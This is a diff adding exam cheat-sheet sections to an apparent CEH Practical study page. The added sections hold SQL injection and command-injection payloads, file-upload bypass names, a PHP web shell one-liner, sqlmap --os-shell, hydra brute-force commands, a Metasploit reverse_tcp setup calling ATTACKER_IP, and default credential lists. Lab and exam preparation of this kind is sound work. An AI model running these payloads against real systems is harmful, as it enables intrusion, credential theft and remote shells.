@@ -54,7 +54,219 @@
                     <li><strong>If stuck 20+ min</strong>, skip and move on. Return at the end.</li>
                 </ol>
             </div>
-            <section class="lab-task"><h3>Footprinting &amp; Reconnaissance</h3><div class="section-card">                <p><span class="tool-tag">Google Advanced Operators</span></p>                <pre><code># Find login pages on target site
+                                    <section class="lab-task"><h3>Troubleshooting - When Tools Fail</h3><div class="section-card">
+                <p><span class="tool-tag">What to do when tools return empty, timeout, or error. Covers the most common exam blockers.</span></p>
+
+                <p><strong>Port scan returns nothing:</strong></p>
+                <pre><code>
+nmap -sS TARGET_IP
+nmap -sT TARGET_IP
+nmap -sU TARGET_IP
+nmap -Pn TARGET_IP
+nmap -f TARGET_IP
+nmap -g 80 TARGET_IP
+
+ping TARGET_IP
+nmap -sn TARGET_IP
+</code></pre>
+
+                <p><strong>NetBIOS/SMB returns empty:</strong></p>
+                <pre><code>
+nmap -p 445 TARGET_IP
+smbclient -L //TARGET_IP -N
+enum4linux -a TARGET_IP
+nmap -p 445 --script smb-os-discovery TARGET_IP
+rpcclient -U "" TARGET_IP
+</code></pre>
+
+                <p><strong>SQL injection not working:</strong></p>
+                <pre><code>
+' OR 1=1 --
+' OR '1'='1
+1' AND 1=1 --
+1' AND 1=2 --
+
+# Try different quote types: single, double, no quotes
+# Try URL encoding: %27 for quote, %20 for space
+# Try different comment: --, #, /* */
+# Try different injection points: GET params, POST body, headers, cookies
+</code></pre>
+
+                <p><strong>File upload rejected:</strong></p>
+                <pre><code>
+# Try different extensions
+shell.php5
+shell.phtml
+shell.php.jpg
+shell.php%00.jpg
+shell.PHP
+
+# Bypass content-type check
+# Change Content-Type to image/jpeg in Burp/ZAP
+</code></pre>
+
+                <p><strong>Hydra too slow or failing:</strong></p>
+                <pre><code>
+hydra -l user -P rockyou.txt -t 4 -f ssh://TARGET_IP
+# -t 4: 4 threads
+# -f: stop on first found
+# Try smaller wordlist first: head -1000 rockyou.txt
+# Check port: nmap -sV TARGET_IP (might not be 22)
+</code></pre>
+
+                <p><strong>General tips:</strong></p>
+                <ul>
+                    <li>Always run nmap -sV first to identify services and versions</li>
+                    <li>Check if firewall is blocking: try -Pn (skip ping) and -f (fragment)</li>
+                    <li>If a tool is outdated, use manual methods (curl, browser DevTools)</li>
+                    <li>Save all output to files: nmap -oN scan.txt, hydra -o cracked.txt</li>
+                    <li>Read the question carefully - answer format matters (IP, count, hash, password)</li>
+                </ul>
+            </div></section>
+
+            <section class="lab-task"><h3>Default Credentials - Try First</h3><div class="section-card">
+                <p><span class="tool-tag">Common default credentials. Always try these before brute forcing - saves time.</span></p>
+                <pre><code>
+# Linux/SSH
+root / toor
+root / root
+ubuntu / ubuntu
+user / user
+
+# Windows/RDP/SMB
+administrator / administrator
+admin / admin
+admin / password
+admin / 123456
+
+# Web applications
+admin / admin
+admin / password
+admin / 123456
+test / test
+guest / guest
+
+# Databases
+root / (blank)
+sa / (blank)
+postgres / postgres
+
+# Routers/Network
+admin / admin
+admin / password
+cisco / cisco
+</code></pre>
+            </div></section>
+<section class="lab-task"><h3>Exam Scenarios - Common Question Patterns</h3><div class="section-card">
+                <p><span class="tool-tag">Quick reference for the most common CEH Practical exam question types. Each scenario: identify the service, exploit or authenticate, extract the answer.</span></p>
+
+                <p><strong>1. Find NetBIOS Name:</strong></p>
+                <pre><code># Nmap NSE (most reliable)
+nmap -sU -p 137 --script nbstat TARGET_IP
+
+# enum4linux
+enum4linux -n TARGET_IP
+
+# nbtscan
+nbtscan TARGET_IP
+
+# If NetBIOS disabled (port 137 closed), use SMB:
+smbclient -L //TARGET_IP -N
+enum4linux -a TARGET_IP
+nmap -p 445 --script smb-os-discovery TARGET_IP
+
+                <p><strong>2. Access File on a Target IP (SMB/FTP/NFS):</strong></p>
+                <pre><code># SMB shares
+smbclient -L //TARGET_IP -N
+smbmap -H TARGET_IP
+enum4linux -a TARGET_IP
+
+# Access share without password
+smbclient //TARGET_IP/sharename -N
+# Inside smbclient: ls, get filename, mget *
+
+# FTP anonymous
+ftp TARGET_IP   # user: anonymous, pass: anonymous
+ls; get secret.txt; mget *.txt
+
+# NFS shares
+showmount -e TARGET_IP
+mkdir /tmp/nfs; mount -t nfs TARGET_IP:/exported /tmp/nfs
+ls /tmp/nfs; cat /tmp/nfs/flag.txt
+</code></pre>
+
+                <p><strong>3. Web Shell / Command Execution:</strong></p>
+                <pre><code># Test command injection: ; ls, | whoami, && id, `cat /etc/passwd`
+# In URL: http://target.com/page?ip=127.0.0.1;cat+/etc/passwd
+# In form: 127.0.0.1; ls -la /var/www/html
+
+# Read target file:
+; cat /home/user/flag.txt
+; find / -name "flag*" 2>/dev/null
+
+# File upload web shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+# Upload, then: curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
+
+# SQLi to OS shell
+sqlmap -u 'http://target.com/page?id=1' --os-shell
+# Or manual: ; EXEC xp_cmdshell 'type C:\flag.txt'; -- (MSSQL)
+</code></pre>
+
+                <p><strong>4. Extract Password from Website (SQLi):</strong></p>
+                <pre><code># Test injection: ' OR 1=1 --
+# Column count: ' ORDER BY 1 --  (increment until error)
+# Union extract: ' UNION SELECT 1,username,password FROM users --
+# Or: ' UNION SELECT 1,group_concat(username,':',password) FROM users --
+
+# sqlmap (if working):
+sqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump
+
+# Crack hashes:
+john --format=raw-md5 hash.txt
+hashcat -m 0 -a 0 hash.txt rockyou.txt
+</code></pre>
+
+                <p><strong>5. SSH Password Cracking:</strong></p>
+                <pre><code># Hydra (most common)
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
+hydra -L users.txt -P rockyou.txt ssh://TARGET_IP
+
+# Try default creds first: root/toor, admin/admin, ubuntu/ubuntu
+# Check port: nmap -sV TARGET_IP (might be 2222)
+hydra -l root -P rockyou.txt -s 2222 ssh://TARGET_IP
+
+# Metasploit
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS TARGET_IP; set USERNAME root; set PASS_FILE rockyou.txt; run
+</code></pre>
+
+                <p><strong>6. Gain Shell and Read File:</strong></p>
+                <pre><code># Metasploit exploitation
+msfconsole
+use exploit/... ; set RHOSTS TARGET_IP; set LHOST ATTACKER_IP
+set payload windows/meterpreter/reverse_tcp; exploit
+
+# In meterpreter:
+ls; cat /path/to/file; search -f flag.txt
+download /path/to/file /tmp/
+
+# Or SSH after cracking password:
+ssh user@TARGET_IP
+find / -name "flag*" 2>/dev/null
+cat /home/user/flag.txt; cat /root/flag.txt
+</code></pre>
+
+                <p><strong>7. File Access Quick Commands (once you have shell):</strong></p>
+                <pre><code>find / -name "flag*" 2>/dev/null
+find / -name "*.txt" 2>/dev/null | head -20
+ls -la /home/*/ /root/ /tmp/ /var/www/ /opt/ 2>/dev/null
+grep -r "flag" /home/ /var/www/ 2>/dev/null
+cat /etc/passwd | grep -v nologin
+</code></pre>
+
+            </div></section>
+<section class="lab-task"><h3>Footprinting &amp; Reconnaissance</h3><div class="section-card">                <p><span class="tool-tag">Google Advanced Operators</span></p>                <pre><code># Find login pages on target site
 intitle:login site:eccouncil.org
 
 # Search specific file types
